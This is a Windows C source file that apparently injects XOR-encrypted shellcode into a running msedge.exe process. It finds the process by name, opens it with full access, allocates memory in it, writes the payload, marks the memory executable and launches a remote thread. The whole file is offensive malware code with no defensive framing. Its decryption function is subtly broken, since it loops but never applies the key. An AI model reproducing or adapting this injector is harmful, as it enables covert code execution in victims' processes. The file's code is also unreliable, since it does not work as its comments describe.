#include <stdio.h>
#include <windows.h>
#include <Tlhelp32.h>

unsigned char key[] = {
	0x31,0x37,0x30,0x31,0x32,0x37,0x31,0x30,0x30,0x30,0x30,0x30,0x5a,0x30,0x63,0x31
};

//shellcode XOR encrypted first from XORPayloadEnc via defined key
unsigned char shellcode[] = {"\xcd\x7f\xb3\xd5\xc2\xdf\xfd\x30\x30\x30\x71\x61\x1b\x60\x31\x79\x00\xe5\x61\x67\x57\x7f\xba\x62\x50\x78\xbb\x62\x42\x78\xe8\x63\x11\x7f\xbb\x43\x62\x7a\x00\xf9\x78\x3f\x87\x7a\x10\x78\x52\xf1\x9d\x0b\x51\x4d\x30\x1b\x11\x71\xf1\xf9\x3d\x71\x5b\xf1\x81\xdc\x63\x76\x61\x79\xb9\x65\x11\xbb\x72\x0c\x78\x31\x8a\x56\xe2\x49\x29\x3c\x32\x3e\xb7\x45\x31\x30\x30\xbb\xb0\xb8\x5a\x30\x63\x79\xb4\xf7\x44\x56\x7a\x36\xe1\x60\x74\xbb\x70\x10\x13\x31\xb3\xba\x79\x2f\xd3\x67\x7a\xc8\xf8\x71\xbb\x04\xb8\x78\x5b\xe6\x2e\x00\xf8\x7f\x01\xf1\x9e\x76\xf0\xf9\x3d\x71\x31\xf1\x62\xd0\x16\xc0\x7d\x34\x7c\x15\x3a\x72\x08\xe1\x45\xe8\x68\x74\xd1\x70\x47\x78\x30\xe7\x56\x70\xb9\x3b\x79\x74\xbb\x70\x2c\x79\x5b\xe0\x22\xba\x35\xbf\x71\x69\x73\x6f\x6f\x78\x31\xe0\x69\x6a\x1b\x68\x22\x68\x70\x6d\x78\xb2\xde\x17\x70\x62\xcf\xd0\x68\x71\x03\x6a\x2b\xba\x23\xde\x7b\xce\xcd\xc8\x6c\x78\x01\xeb\x63\x79\xe4\x47\x0a\x5f\x58\x59\x55\x45\x32\x76\x67\x78\xb9\xd1\x79\xf7\x98\x7c\x14\x17\x36\xc8\xe5\x62\x61\x7f\xb8\xd1\x63\x6a\x7d\x01\x9a\x7d\x52\xf8\x62\x64\x79\x8b\x08\x61\x48\x97\x30\x30\x30\x30\xa5\xe5\x8b\x3f\x31\x37\x30\x00\x0b\x05\x1f\x01\x06\x08\x1e\x00\x74\x01\x51\x03\x31\x6d\x78\xb8\xf3\x7e\xf6\xf0\x8b\x31\x30\x30\x17\x01\xaa\x62\x62\x5d\x33\x62\x7b\x8d\x66\xb9\xaf\xf6\x30\x30\x5a\x30\x9c\xe4\xd9\x6b\x30\x31\x32\x18\x70\x65\x7d\x7d\x54\x62\x0c\x61\x53\x04\x46\x00\x5e\x4b\x43\x53\x69\x51\x74\x59\x55\x61\x0f\x7e\x09\x5a\x44\x45\x61\x49\x54\x02\x01\x5f\x68\x5e\x60\x61\x00\x67\x07\x67\x75\x72\x49\x54\x0b\x65\x50\x5c\x56\x59\x64\x76\x12\x78\x2f\x5d\x6b\x59\x5d\x07\x00\x07\x5c\x6a\x79\x53\x71\x63\x22\x79\x2c\x47\x47\x74\x63\x05\x6d\x65\x40\x66\x04\x7a\x72\x09\x6b\x52\x5b\x58\x31\x7f\xb9\xf0\x61\x6d\x70\x68\x7d\x01\xf9\x63\x12\x88\x63\x03\x99\xb3\x30\x31\x32\x37\x61\x63\x63\x79\xf7\xf2\xb1\x65\x4d\x0a\xce\xe2\x78\xb8\xf4\x5d\x3b\x6f\x78\xb9\xc1\x5a\x45\x6a\x31\x59\xb1\x04\x30\x31\x7b\xbe\xd1\x5a\x34\x71\x69\x79\xe0\x45\x25\xaf\xb7\x37\x30\x31\x32\xc8\xe4\x7d\x01\xf0\x63\x6a\x12\xb9\x92\x7c\x00\xfe\x7d\x00\xfb\x64\x62\x79\xf7\xf2\x1d\x36\x42\x4b\x9c\xe4\xb4\xf7\x45\x2e\x7a\xf0\xf0\xb8\x23\x30\x30\x79\xe0\x74\x93\x04\xd1\x37\x30\x31\x32\xc8\xe4\x78\xcf\xff\x44\x32\xb1\x9a\x8b\x64\x31\x37\x30\x62\x6b\x5d\x71\x6a\x79\xb9\xe1\xf1\xb8\x20\x2a\xf6\xf1\x37\x20\x31\x32\x7e\x8b\x68\x94\x63\xd5\x30\x5a\x30\x63\xce\xe4\x7f\xa3\x62\x61\x7f\xb8\xd7\x78\xb9\xc1\x78\xd3\xea\x2a\xf6\xf1\x37\x10\x31\x32\x7e\xb8\xc9\x79\x8a\x22\xa6\xd3\xd2\x63\x31\x31\x37\xcf\xe4\x7a\xb4\xf5\x10\xb5\xf0\x44\x82\x3c\xbb\x64\x79\x30\xf4\xb5\xf1\x47\xe5\x69\xf3\x68\x5a\x30\x69\x13\xf7\xa1\xc1\x84\x95\x66\xce\xe7\x37"};

//get the handle for injection
BOOL GetRemoteProcessHandle(LPWSTR szProcessName, DWORD* dwProcessId, HANDLE* hProcess) {

    HANDLE			hSnapShot = NULL;
    PROCESSENTRY32	Proc = {
                    .dwSize = sizeof(PROCESSENTRY32)
    };

    hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
    if (hSnapShot == INVALID_HANDLE_VALUE) {
        goto _EndOfFunction;
    }

    if (!Process32First(hSnapShot, &Proc)) {
        goto _EndOfFunction;
    }

    do {

        WCHAR LowerName[MAX_PATH * 2];

        if (Proc.szExeFile) {

            DWORD	dwSize = lstrlenW(Proc.szExeFile);
            DWORD   i = 0;
            RtlSecureZeroMemory(LowerName, MAX_PATH * 2);

            if (dwSize < MAX_PATH * 2) {
                for (; i < dwSize; i++)
                    LowerName[i] = (WCHAR)tolower(Proc.szExeFile[i]);
                LowerName[i++] = '\0';
            }
        }

        if (wcscmp(LowerName, szProcessName) == 0) {
            *dwProcessId = Proc.th32ProcessID;
            *hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Proc.th32ProcessID);
            if (*hProcess == NULL)
            break;
        }
    } while (Process32Next(hSnapShot, &Proc));


_EndOfFunction:
    if (hSnapShot != NULL)
        CloseHandle(hSnapShot);
    if (*dwProcessId == NULL || *hProcess == NULL)
        return FALSE;
    return TRUE;
}

//injection part
BOOL InjectShellcodeToRemoteProcess(HANDLE hProcess, PBYTE pShellcode, SIZE_T sSizeOfShellcode) {

    PVOID	pShellcodeAddress = NULL;
    SIZE_T	sNumberOfBytesWritten = NULL;
    DWORD	dwOldProtection = NULL;

    pShellcodeAddress = VirtualAllocEx(hProcess, NULL, sSizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pShellcodeAddress == NULL) {
        return FALSE;
    }

    if (!WriteProcessMemory(hProcess, pShellcodeAddress, pShellcode, sSizeOfShellcode, &sNumberOfBytesWritten) || sNumberOfBytesWritten != sSizeOfShellcode) {
        return FALSE;
    }

    memset(pShellcode, '\0', sSizeOfShellcode);

    if (!VirtualProtectEx(hProcess, pShellcodeAddress, sSizeOfShellcode, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
        return FALSE;
    }

    if (CreateRemoteThread(hProcess, NULL, NULL, pShellcodeAddress, NULL, NULL, NULL) == NULL) {
        return FALSE;
    }

    return TRUE;
}

VOID XorByInputKey(IN PBYTE pShellcode, IN SIZE_T sShellcodeSize, IN PBYTE bKey, IN SIZE_T sKeySize) {
    for (size_t i = 0, j = 0; i < sShellcodeSize; i++, j++) {
        if (j >= sKeySize) {
            j = 0;
        }
    }
}

int main()
{
    HANDLE  hProcess = NULL;
    DWORD   dwProcessId = NULL;
    XorByInputKey(shellcode, sizeof(shellcode), key, sizeof(key));
    LPCWSTR InjectVictim = L"msedge.exe";
    GetRemoteProcessHandle(InjectVictim, &dwProcessId, &hProcess);
    InjectShellcodeToRemoteProcess(hProcess, shellcode, sizeof(shellcode));
    return 0;
}
